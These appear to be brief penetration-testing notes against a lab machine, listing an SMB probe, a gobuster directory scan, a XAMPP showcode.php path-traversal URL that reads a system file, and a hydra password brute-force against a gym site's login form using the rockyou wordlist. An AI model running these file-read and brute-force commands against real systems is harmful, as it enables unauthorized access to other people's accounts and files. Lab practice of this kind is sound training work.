```
10.129.15.175
cme smb 10.129.15.175 -> nothing

gobuster dir -u http://10.129.15.175:8080/ -w ~/wordlists/directory-list-2.3-small.txt -x php

http://10.129.15.175:8080/xampp/showcode.php/c:boot.ini?showcode=1


FILES_PATH >> C:\xampp\htdocs\gym\<name>.php 


hydra -l mrb3n -P /home/jello/wordlists/rockyou.txt 10.129.15.175 http-post-from \
 "/include/process_login.php:email=^USER^&password=^PASS^" -vV -f
```